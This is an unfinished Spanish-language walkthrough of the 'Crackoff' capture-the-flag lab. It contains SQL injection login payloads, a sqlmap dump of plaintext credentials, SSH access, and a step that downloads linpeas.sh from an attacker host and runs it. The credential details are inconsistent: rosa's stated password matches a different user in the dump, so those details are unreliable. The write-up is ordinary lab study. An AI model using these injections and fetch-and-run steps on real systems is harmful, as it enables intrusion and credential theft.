# Crackoff

Iniciamos con un ping a la máquina

```bash
 ping -c1 172.17.0.2 
```

```bash
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.068 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.068/0.068/0.068/0.000 ms
```

Escaneamos puertos

```bash
nmap -sC -sV -oN crackoff.nmap 172.17.0.2
```

```bash
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-23 13:59 -0500
Nmap scan report for 172.17.0.2
Host is up (0.000043s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3d:fc:bd:41:cb:81:e8:cd:a2:58:5a:78:68:2b:a3:04 (ECDSA)
|_  256 d8:5a:63:27:60:35:20:30:a9:ec:25:36:9e:50:06:8d (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: CrackOff - Bienvenido
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds
```

Vemos que hay en el servidor Apache y quiero ver el contenido:

```
curl http://172.17.0.2
```

```html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CrackOff - Bienvenido</title>
    <style>
        body {
            margin: 0;
            font-family: 'Courier New', Courier, monospace;
            color: #00ff00;
            background: black;
            overflow: hidden;
            text-align: center;
        }
        header {
            background-color: #003300;
            padding: 20px;
            color: #00ff00;
            font-size: 2.5em;
            border-bottom: 2px solid #00ff00;
            text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
        }
        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 80vh;
            position: relative;
        }
        .title {
            font-size: 3em;
            margin: 20px;
            text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
        }
        .button {
            display: inline-block;
            padding: 15px 30px;
            margin: 10px;
            font-size: 1.5em;
            color: #000;
            background-color: #00ff00;
            border: 2px solid #00cc00;
            border-radius: 5px;
            text-decoration: none;
            transition: all 0.3s ease;
        }
        .button:hover {
            background-color: #00cc00;
            color: #fff;
            transform: scale(1.1);
        }
        .info-box {
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            margin: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px #00ff00;
            max-width: 800px;
            text-align: left;
        }
        .info-box h3 {
            font-size: 1.8em;
        }
        footer {
            position: absolute;
            bottom: 0;
            width: 100%;
            background-color: #003300;
            color: #00ff00;
            padding: 10px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <header>
        CrackOff - Hacking Central
    </header>
    <div class="container">
        <div class="title">Bienvenido a CrackOff</div>
        <a href="login.php" class="button">Iniciar Sesión</a>
        <div class="info-box">
            <h3>Información del Sistema</h3>
            <p>Últimos registros:</p>
            <ul>
                <li>12/08/2024 - Sistema operativo actualizado.</li>
                <li>11/08/2024 - Se detectaron intentos de acceso no autorizados.</li>
                <li>10/08/2024 - Nueva vulnerabilidad de ************ reportada.</li>
            </ul>
            <p>Para más detalles, visite nuestro <a href="#" style="color: #00ff00;">panel de administración</a>.</p>
        </div>
    </div>
    <footer>
        &copy; 2024 CrackOff. Todos los derechos reservados.
    </footer>
</body>
</html>
```

Vemos que hay en login.php

```bash
curl http://172.17.0.2/login.php
```

```html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CrackOff - Login</title>
    <style>
        body {
            margin: 0;
            font-family: 'Courier New', Courier, monospace;
            color: #00ff00;
            background: black;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
            position: relative;
        }
        header {
            background-color: #003300;
            padding: 15px;
            color: #00ff00;
            font-size: 2em;
            border-bottom: 2px solid #00ff00;
            text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
            position: absolute;
            top: 0;
            width: 100%;
            left: 0;
            text-align: center;
            z-index: 1000;
        }
        .container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 20px;
        }
        .login-form {
            background: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 15px #00ff00;
            width: 100%;
            max-width: 300px;
            text-align: center;
        }
        .login-form h2 {
            font-size: 1.8em;
            margin-bottom: 15px;
            color: #00ff00;
            text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
        }
        .login-form input {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 10px 0;
            border: 2px solid #00ff00;
            border-radius: 5px;
            background: black;
            color: #00ff00;
            font-size: 1em;
            box-sizing: border-box;
        }
        .login-form input[type="submit"] {
            background-color: #00ff00;
            color: #000;
            cursor: pointer;
            font-size: 1.2em;
            border: none;
            transition: background-color 0.3s, transform 0.3s;
        }
        .login-form input[type="submit"]:hover {
            background-color: #00cc00;
            transform: scale(1.05);
        }
        .info-box {
            background: rgba(0, 0, 0, 0.7);
            padding: 15px;
            border-radius: 10px;
            box-shadow: 0 0 10px #00ff00;
            max-width: 280px;
            text-align: left;
            color: #00ff00;
        }
        .info-box h3 {
            font-size: 1.3em;
            margin-bottom: 10px;
        }
        .info-box p {
            font-size: 0.9em;
            margin: 5px 0;
        }
        footer {
            position: absolute;
            bottom: 0;
            width: 100%;
            background-color: #003300;
            color: #00ff00;
            padding: 5px;
            font-size: 0.8em;
            text-align: center;
        }
    </style>
</head>
<body>
    <header>
        CrackOff - Login
    </header>
    <div class="container">
        <div class="login-form">
            <h2>Acceso Seguro</h2>
            <form action="db.php" method="post">
                <input type="text" name="username" placeholder="Nombre de Usuario" required>
                <input type="password" name="password" placeholder="Contraseña" required>
                <input type="submit" value="Iniciar Sesión">
            </form>
        </div>
        <div class="info-box">
            <h3>¿Problemas para acceder?</h3>
            <p>Si tienes problemas para iniciar sesión, verifica que estés utilizando el nombre de usuario y la contraseña correctos.</p>
            <p>Si el problema persiste, contacta con el administrador del sistema.</p>
        </div>
    </div>
    <footer>
        &copy; 2024 CrackOff. Todos los derechos reservados.
    </footer>
</body>
</html>
```

Vemos si podemos loguear con algún contenido genérico, para ver la respuesta

```bash
curl -X POST -d "username=admin&password=admin" http://172.17.0.2/db.php
```

```bash
Consulta SQL: SELECT * FROM users WHERE username = 'admin' AND password = 'admin'<br>
```

Insertamos una consulta, ya que nos devolvió la estructura

```bash
curl -X POST -d "username=' OR '1'='1&password=123" http://172.17.0.2/db.php
```

```bash
Consulta SQL: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '123'<br>
```

Quiero inyectar un loguin donde la consulta SQL no tenga en cuenta el password

```bash
curl -X POST -d "username=' OR '1'='1' -- -&password=irrelevante" http://172.17.0.2/db.php
```

```bash
Consulta SQL: SELECT * FROM users WHERE username = '' OR '1'='1' -- -' AND password = 'irrelevante'<br>
```

Quiero hacer un escaneo con globuster para lo que me descargo la common.txt

```bash
curl -o common.txt https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt
```

```bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 35849  100 35849    0     0   127k      0 --:--:-- --:--:-- --:--:--  127k
```

Usar el archivo descargado para buscar directorios

```bash
gobuster dir -u http://172.17.0.2 -w ./common.txt -x php,txt,html -o gobuster_crackoff.txt
```

```bash
===============================================================
Gobuster v3.7
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ./common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.7
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta.php             (Status: 403) [Size: 275]
/.hta                 (Status: 403) [Size: 275]
/.hta.txt             (Status: 403) [Size: 275]
/.hta.html            (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/db.php               (Status: 302) [Size: 75] [--> error.php]
/error.php            (Status: 200) [Size: 2705]
/index.php            (Status: 200) [Size: 2974]
/index.php            (Status: 200) [Size: 2974]
/login.php            (Status: 200) [Size: 3968]
/server-status        (Status: 403) [Size: 275]
/welcome.php          (Status: 200) [Size: 2800]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```

Vamos a welcome.php

```bash
curl http://172.17.0.2/welcome.php
```

```html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CrackOff - Panel de Control</title>
    <style>
        body {
            margin: 0;
            font-family: 'Courier New', Courier, monospace;
            color: #00ff00;
            background: black;
            overflow: hidden;
            text-align: center;
        }
        header {
            background-color: #003300;
            padding: 20px;
            color: #00ff00;
            font-size: 2.5em;
            border-bottom: 2px solid #00ff00;
            text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
        }
        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 80vh;
            position: relative;
        }
        .welcome-message {
            font-size: 2.5em;
            margin: 20px;
            text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
        }
        .panel {
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 15px #00ff00;
            max-width: 800px;
            margin: auto;
            text-align: left;
        }
        .panel h3 {
            font-size: 1.8em;
        }
        .button {
            display: inline-block;
            padding: 15px 30px;
            margin: 10px;
            font-size: 1.5em;
            color: #000;
            background-color: #00ff00;
            border: 2px solid #00cc00;
            border-radius: 5px;
            text-decoration: none;
            transition: all 0.3s ease;
        }
        .button:hover {
            background-color: #00cc00;
            color: #fff;
            transform: scale(1.1);
        }
        footer {
            position: absolute;
            bottom: 0;
            width: 100%;
            background-color: #003300;
            color: #00ff00;
            padding: 10px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <header>
        CrackOff - Panel de Control
    </header>
    <div class="container">
        <div class="welcome-message">¡Bienvenido, Admin!</div>
        <div class="panel">
            <h3>Panel de Control</h3>
            <p>Aquí puedes gestionar la base de datos y ver la información.</p>
            <p>Este panel te proporciona acceso a las funciones críticas del sistema. Usa herramientas como sqlmap para extraer datos y analizar la seguridad.</p>
            <a href="index.php" class="button">Volver al Inicio</a>
        </div>
    </div>
    <footer>
        &copy; 2024 CrackOff. Todos los derechos reservados.
    </footer>
</body>
</html>
```

Como puedo enviar consultas al db.php voy a hacer una extracción de esquemas con sqlmap

```bash
sqlmap -u "http://172.17.0.2/db.php" --data="username=admin&password=admin" --batch --dump
```

```bash
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.4#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:19:45 /2025-07-23/

[14:19:46] [INFO] testing connection to the target URL
got a 302 redirect to 'http://172.17.0.2/error.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
[14:19:46] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:19:46] [INFO] testing if the target URL content is stable
[14:19:46] [WARNING] POST parameter 'username' does not appear to be dynamic
[14:19:46] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[14:19:46] [INFO] heuristic (XSS) test shows that POST parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
[14:19:46] [INFO] testing for SQL injection on POST parameter 'username'
[14:19:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:19:46] [WARNING] reflective value(s) found and filtering out
[14:19:46] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[14:19:46] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[14:19:46] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[14:19:46] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[14:19:46] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[14:19:46] [INFO] testing 'Generic inline queries'
[14:19:46] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[14:19:46] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[14:19:46] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[14:19:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[14:19:56] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[14:19:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[14:19:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[14:19:56] [INFO] target URL appears to be UNION injectable with 3 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[14:19:57] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[14:19:57] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 101 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 7056 FROM (SELECT(SLEEP(5)))ZtCy) AND 'kkhc'='kkhc&password=admin
---
[14:20:12] [INFO] the back-end DBMS is MySQL
[14:20:12] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12
[14:20:12] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[14:20:12] [INFO] fetching current database
[14:20:12] [INFO] retrieved: 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[14:20:27] [INFO] adjusting time delay to 1 second due to good response times
cYrackofftrue_db
[14:21:10] [INFO] fetching tables for database: 'crackofftrue_db'
[14:21:10] [INFO] fetching number of tables for database 'crackofftrue_db'
[14:21:10] [INFO] retrieved: 1
[14:21:11] [INFO] retrieved: users
[14:21:27] [INFO] fetching columns for table 'users' in database 'crackofftrue_db'
[14:21:27] [INFO] retrieved: 3
[14:21:30] [INFO] retrieved: id
[14:21:36] [INFO] retrieved: username
[14:21:58] [INFO] retrieved: password
[14:22:26] [INFO] fetching entries for table 'users' in database 'crackofftrue_db'
[14:22:26] [INFO] fetching number of entries for table 'users' in database 'crackofftrue_db'
[14:22:26] [INFO] retrieved: 12
[14:22:32] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)               
1
[14:22:34] [INFO] retrieved: password123
[14:23:07] [INFO] retrieved: rejetto
[14:23:31] [INFO] retrieved: 2
[14:23:34] [INFO] retrieved: alicelaultramejor
[14:24:22] [INFO] retrieved: tomitoma
[14:24:48] [INFO] retrieved: 3
[14:24:51] [INFO] retrieved: passwordinhack
[14:25:35] [INFO] retrieved: alice
[14:25:47] [INFO] retrieved: 4
[14:25:51] [INFO] retrieved: supersecurepasswordultra
[14:27:06] [INFO] retrieved: whoami
[14:27:25] [INFO] retrieved: 5
[14:27:28] [INFO] retrieved: estrella_big
[14:28:07] [INFO] retrieved: pip
[14:28:20] [INFO] retrieved: 6
[14:28:24] [INFO] retrieved: colorcolorido
[14:29:09] [INFO] retrieved: rufus
[14:29:25] [INFO] retrieved: 7
[14:29:29] [INFO] retrieved: ultramegaverypasswordhack
[14:30:44] [INFO] retrieved: jazmin
[14:31:02] [INFO] retrieved: 8
[14:31:07] [INFO] retrieved: unbreackroot
[14:31:44] [INFO] retrieved: rosa
[14:31:56] [INFO] retrieved: 9
[14:31:59] [INFO] retrieved: happypassword
[14:32:45] [INFO] retrieved: mario
[14:32:59] [INFO] retrieved: 10
[14:33:02] [INFO] retrieved: admin12345password
[14:33:56] [INFO] retrieved: veryhardpassword
[14:34:47] [INFO] retrieved: 11
[14:34:51] [INFO] retrieved: carsisgood
[14:35:21] [INFO] retrieved: root
[14:35:37] [INFO] retrieved: 12
[14:35:41] [INFO] retrieved: badmenandwomen
[14:36:23] [INFO] retrieved: admin
Database: crackofftrue_db
Table: users
[12 entries]
+----+---------------------------+------------------+
| id | password                  | username         |
+----+---------------------------+------------------+
| 1  | password123               | rejetto          |
| 2  | alicelaultramejor         | tomitoma         |
| 3  | passwordinhack            | alice            |
| 4  | supersecurepasswordultra  | whoami           |
| 5  | estrella_big              | pip              |
| 6  | colorcolorido             | rufus            |
| 7  | ultramegaverypasswordhack | jazmin           |
| 8  | unbreackroot              | rosa             |
| 9  | happypassword             | mario            |
| 10 | admin12345password        | veryhardpassword |
| 11 | carsisgood                | root             |
| 12 | badmenandwomen            | admin            |
+----+---------------------------+------------------+

[14:36:38] [INFO] table 'crackofftrue_db.users' dumped to CSV file '/home/juan/.local/share/sqlmap/output/172.17.0.2/dump/crackofftrue_db/users.csv'
[14:36:38] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 44 times
[14:36:38] [INFO] fetched data logged to text files under '/home/juan/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 14:36:38 /2025-07-23/
```

Limpiamos el ssh

```bash
ssh-keygen -R 172.17.0.2
```

```bash
# Host 172.17.0.2 found: line 1
# Host 172.17.0.2 found: line 2
# Host 172.17.0.2 found: line 3
/home/juan/.ssh/known_hosts updated.
```

Probamos acceso con los usuarios y contraseñas obtenidas

Me funcionó con usuario: rosa y contraseña: ultramegaverypasswordhack 

```bash
ssh rosa@172.17.0.2
```

```bash
rosa@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.1.4-arch1-1 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
```

Confirmamos usuario

```bash
id
```

```bash
uid=1002(rosa) gid=1002(rosa) groups=1002(rosa),100(users)
```

Vemos a qué carpetas compartidas por todos, tenemos acceso

```bash
find / -type f \( -name "*.sh" -o -executable \) -user root 2>/dev/null
```

```bash
/etc/security/namespace.init
/etc/update-motd.d/50-motd-news
/etc/update-motd.d/10-help-text
/etc/update-motd.d/60-unminimize
/etc/update-motd.d/00-header
/etc/cron.daily/apt-compat
/etc/cron.daily/dpkg
/etc/cron.daily/apache2
/etc/profile.d/01-locale-fix.sh
/etc/init.d/procps
/etc/init.d/tomcat
/etc/init.d/apache-htcacheclean
/etc/init.d/x11-common
/etc/init.d/apache2
/etc/init.d/ssh
/etc/init.d/mysql
/etc/init.d/dbus
/etc/X11/Xsession
/etc/X11/Xreset
/etc/xdg/Xwayland-session.d/00-at-spi
/etc/mysql/debian-start
/etc/ca-certificates/update.d/jks-keystore
/.dockerenv
```

Encuentro interesante estos 2 directorios:

- /etc/init.d/: Contiene scripts de inicialización del sistema para varios servicios.
- /etc/profile.d/: Contiene scripts que se ejecutan al iniciar sesión.

Más específicamente me parecen interesantes las siguientes aplicaciones en el init.d:

- /etc/init.d/apache2: Script de inicialización para el servidor web Apache. Vulnerabilidades en Apache o en configuraciones incorrectas podrían ser explotadas.
- /etc/init.d/mysql: Script de inicialización para el servidor de base de datos MySQL. Vulnerabilidades en MySQL o configuraciones incorrectas podrían ser explotadas.
- /etc/init.d/ssh: Script de inicialización para el servidor SSH. Vulnerabilidades en SSH o configuraciones incorrectas podrían ser explotadas.

Según las **guías**, tomcat es vulnerable, entonces seguiré por ese lado... 

Veamos qué está corriendo en tomcat

```bash
ps aux | grep -i tomcat
```

```bash
root           1  4.1  0.0   2800  1092 ?        Ss   Jul23  11:24 /bin/sh -c service ssh start && service apache2 start && service tomcat start && service mysql start && while true; do /bin/bash /opt/alice/boss; done
tomcat        59  0.0  1.2 8380168 196268 ?      Sl   Jul23   0:14 /usr/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start
rosa      861311  0.0  0.0   3956  2056 pts/0    S+   01:25   0:00 grep --color=auto -i tomcat
```

Vamos a la ruta del manager:

```bash
curl http://localhost:8080/manager/html
```

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
 <head>
  <title>401 Unauthorized</title>
  <style type="text/css">
    <!--
    BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;font-size:12px;}
    H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;}
    PRE, TT {border: 1px dotted #525D76}
    A {color : black;}A.name {color : black;}
    -->
  </style>
 </head>
 <body>
   <h1>401 Unauthorized</h1>
   <p>
    You are not authorized to view this page. If you have not changed
    any configuration files, please examine the file
    <tt>conf/tomcat-users.xml</tt> in your installation. That
    file must contain the credentials to let you use this webapp.
   </p>
   <p>
    For example, to add the <tt>manager-gui</tt> role to a user named
    <tt>tomcat</tt> with a password of <tt>s3cret</tt>, add the following to the
    config file listed above.
   </p>
<pre>
&lt;role rolename="manager-gui"/&gt;
&lt;user username="tomcat" password="s3cret" roles="manager-gui"/&gt;
</pre>
   <p>
    Note that for Tomcat 7 onwards, the roles required to use the manager
    application were changed from the single <tt>manager</tt> role to the
    following four roles. You will need to assign the role(s) required for
    the functionality you wish to access.
   </p>
    <ul>
      <li><tt>manager-gui</tt> - allows access to the HTML GUI and the status
          pages</li>
      <li><tt>manager-script</tt> - allows access to the text interface and the
          status pages</li>
      <li><tt>manager-jmx</tt> - allows access to the JMX proxy and the status
          pages</li>
      <li><tt>manager-status</tt> - allows access to the status pages only</li>
    </ul>
   <p>
    The HTML interface is protected against CSRF but the text and JMX interfaces
    are not. To maintain the CSRF protection:
   </p>
   <ul>
    <li>Users with the <tt>manager-gui</tt> role should not be granted either
        the <tt>manager-script</tt> or <tt>manager-jmx</tt> roles.</li>
    <li>If the text or jmx interfaces are accessed through a browser (e.g. for
        testing since these interfaces are intended for tools not humans) then
        the browser must be closed afterwards to terminate the session.</li>
   </ul>
   <p>
    For more information - please see the
    <a href="/docs/manager-howto.html" rel="noopener noreferrer">Manager App How-To</a>.
   </p>
 </body>

</html>
```

Intentamos ingresar a los tomcat-users.xml que mencionan acá desde el usuario rosa

```sh
cat /opt/tomcat/conf/tomcat-users.xml
```

```sh
cat: /opt/tomcat/conf/tomcat-users.xml: Permission denied
```

Bueno... siguiendo las **guías**, en el anterior comando vimos lo siguiente:

- start && service apache2 start && service tomcat start && service mysql start && while true; do /bin/bash /opt/alice/boss; done

Este comando inicia varios servicios (SSH, Apache2, Tomcat, MySQL) y luego entra en un bucle infinito ejecutando el script /opt/alice/boss.

Así que vamos a explorar ese directorio:

```sh
ls -l /opt/alice/boss
```

```sh
ls: cannot access '/opt/alice/boss': Permission denied
```

No tenemos permiso pero sabemos que el archivo existe

Intentamos como los dicela guía con linpeas.sh que podemos detectar:

- Cron jobs mal configurados

- Scripts ejecutados con root que dependen de archivos en otros lugares

- Archivos con capabilities

- Variables de entorno globales expuestas

- Configuraciones de servicios mal cerradas

Vamos a servirle el archivo **linpeas.sh** a la víctima desde el usuario rosa, usando nuestro host como servidor.

1. Descargamos el linpeas.sh

   ```sh
   curl -L -o linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
   ```

2. Damos permiso

   ```sh
   chmod +x linpeas.sh
   ```

3. Lo servimos con python server

   ```sh
   python3 -m http.server 8080
   ```

Ahora en nuestro usuario rosa:

1. Abrimos la carpeta /tmp

   ```sh
   cd /tmp
   ```

2. Descargamos el script

   ```sh
   wget http://<HOST_IP>:8080/linpeas.sh
   ```

3. Damos permisos

   ```sh
   chmod +x linpeas.sh
   ```

4. Ejecutamos el **script**

   ```sh
   ./linpeas.sh
   ```

5. Resultados

   [linpeas_results.txt](./linpeas_result.txt)

**Hallazgos**

1. El proceso principal de root es:

   ```sh
   /bin/sh -c service ssh start && service apache2 start && service tomcat start && service mysql start && while true; do /bin/bash /opt/alice/boss; done
   ```

   El punto cítico para escalar es **/opt/alice/boss** 

2. Hay un Tomcat corriendo en 127.0.0.1:8080, accesible sólo desde dentro del contenedor

   ```sh
   tcp6  0  0 127.0.0.1:8080 :::* LISTEN -
   ```

3. Apache corriendo como root y www-data

   ```sh
   /usr/sbin/apache2 -k start
   ```

4. Credenciales en memoria:

   LinPEAS detectó procesos con credenciales potenciales en memoria:

   - `tomcat`
   - `mysql`
   - `apache2`
   - `sshd`

5. Se detectan algunas vulnerabilidades:

   1. `CVE-2022-2586` (nft_object UAF)
   2. `CVE-2021-22555` (Netfilter heap overflow)

## Subir una reverse shell desde el panel de administración de tomcat

- Anteriormente tenemos como usuario y contraseña a:

```sh
| username   | password           |
|------------|--------------------|
| tomitoma   | alicelaultramejor  |
| alice      | passwordinhack     |
| rosa       | unbreackroot       |
| admin      | badmenandwomen     |
```

- Vamos a probar acceso a tomcat con el usuario tomitoma

```sh
curl -u tomitoma:alicelaultramejor http://localhost:8080/manager/html
```

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
 <head>
  <title>401 Unauthorized</title>
  <style type="text/css">
    <!--
    BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;font-size:12px;}
    H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;}
    PRE, TT {border: 1px dotted #525D76}
    A {color : black;}A.name {color : black;}
    -->
  </style>
 </head>
 <body>
   <h1>401 Unauthorized</h1>
   <p>
    You are not authorized to view this page. If you have not changed
    any configuration files, please examine the file
    <tt>conf/tomcat-users.xml</tt> in your installation. That
    file must contain the credentials to let you use this webapp.
   </p>
   <p>
    For example, to add the <tt>manager-gui</tt> role to a user named
    <tt>tomcat</tt> with a password of <tt>s3cret</tt>, add the following to the
    config file listed above.
   </p>
<pre>
&lt;role rolename="manager-gui"/&gt;
&lt;user username="tomcat" password="s3cret" roles="manager-gui"/&gt;
</pre>
   <p>
    Note that for Tomcat 7 onwards, the roles required to use the manager
    application were changed from the single <tt>manager</tt> role to the
    following four roles. You will need to assign the role(s) required for
    the functionality you wish to access.
   </p>
    <ul>
      <li><tt>manager-gui</tt> - allows access to the HTML GUI and the status
          pages</li>
      <li><tt>manager-script</tt> - allows access to the text interface and the
          status pages</li>
      <li><tt>manager-jmx</tt> - allows access to the JMX proxy and the status
          pages</li>
      <li><tt>manager-status</tt> - allows access to the status pages only</li>
    </ul>
   <p>
    The HTML interface is protected against CSRF but the text and JMX interfaces
    are not. To maintain the CSRF protection:
   </p>
   <ul>
    <li>Users with the <tt>manager-gui</tt> role should not be granted either
        the <tt>manager-script</tt> or <tt>manager-jmx</tt> roles.</li>
    <li>If the text or jmx interfaces are accessed through a browser (e.g. for
        testing since these interfaces are intended for tools not humans) then
        the browser must be closed afterwards to terminate the session.</li>
   </ul>
   <p>
    For more information - please see the
    <a href="/docs/manager-howto.html" rel="noopener noreferrer">Manager App How-To</a>.
   </p>
 </body>

</html>
```

Tomcat está activo en /manager/html pero el usuario tomitoma no tiene el rol manager-gui, que es necesario para acceder al panel HTML.

**Probé conectar con varios usuarios pero no obuve resultados:**

```sh
curl -u veryhardpassword:admin12345password http://localhost:8080/manager/text/list
```

## Estado actual

- Estoy conectado como usuario rosa`, sin privilegios `sudo`.
- Probé varias credenciales del dump sin éxito para el `Tomcat Manager`.
- Tomcat está activo en `localhost:8080` pero inaccesible externamente.
- Probé comandos para escalar con el PATH (`/tmp/date`, `/tmp/id`, etc.) sin éxito.
- **No tengo aún acceso al usuario que puede ejecutar `/opt/alice/boss`.**
